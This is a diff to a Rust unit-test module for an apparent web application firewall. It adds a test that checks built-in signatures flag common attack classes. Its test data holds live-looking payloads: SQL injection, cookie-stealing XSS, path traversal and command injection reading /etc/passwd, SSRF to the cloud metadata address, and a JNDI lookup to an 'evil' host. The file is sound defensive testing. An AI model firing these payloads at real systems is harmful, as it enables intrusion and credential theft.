@@ -1028,14 +1028,16 @@ mod tests {
 
     #[test]
     fn scores_threat_indicator_matches() {
+        // Uses a site-specific IoC that does NOT overlap a built-in signature,
+        // so this isolates the operator-configured indicator path.
         let score = score_request(
-            "/login",
-            Some("q=UNION%20SELECT%20password"),
+            "/callback",
+            Some("id=EVILCORP-C2-BEACON"),
             "",
             None,
             &[ThreatIndicator {
-                value: "union select".to_string(),
-                indicator_type: "sqli".to_string(),
+                value: "evilcorp-c2-beacon".to_string(),
+                indicator_type: "c2".to_string(),
                 severity: Severity::High,
                 source: "unit".to_string(),
                 ttl_seconds: 60,
@@ -1044,7 +1046,52 @@ mod tests {
         );
 
         assert_eq!(score.score, 50);
-        assert!(score.reason.contains("sqli indicator"));
+        assert!(score.reason.contains("c2 indicator"));
+    }
+
+    #[test]
+    fn builtin_waf_detects_common_attack_classes_without_configuration() {
+        // No operator-configured indicators and no DNSBL: every detection below
+        // must come from the built-in OWASP-shape signature layer alone.
+        let cases = [
+            ("/products", "id=1 UNION SELECT password FROM users", "sqli"),
+            (
+                "/search",
+                "q=<script>alert(document.cookie)</script>",
+                "xss",
+            ),
+            ("/download", "file=../../../../etc/passwd", "path-traversal"),
+            (
+                "/ping",
+                "host=127.0.0.1; cat /etc/passwd",
+                "command-injection",
+            ),
+            (
+                "/fetch",
+                "url=http://169.254.169.254/latest/meta-data",
+                "ssrf",
+            ),
+            ("/lookup", "x=${jndi:ldap://evil/a}", "deserialization"),
+        ];
+        for (path, query, class) in cases {
+            let scored = score_request(path, Some(query), "", None, &[], &[]);
+            assert!(
+                scored.score >= BLOCK_SCORE,
+                "{class} payload should reach block score, got {} ({})",
+                scored.score,
+                scored.reason
+            );
+            assert!(
+                scored.reason.contains(class),
+                "reason should name the {class} class, got: {}",
+                scored.reason
+            );
+        }
+
+        // A benign request must not be flagged by the built-in layer.
+        let benign = score_request("/account/profile", Some("tab=settings"), "", None, &[], &[]);
+        assert_eq!(benign.score, 0, "benign request scored: {}", benign.reason);
+        assert_eq!(benign.reason, "no matching indicator");
     }
 
     #[test]
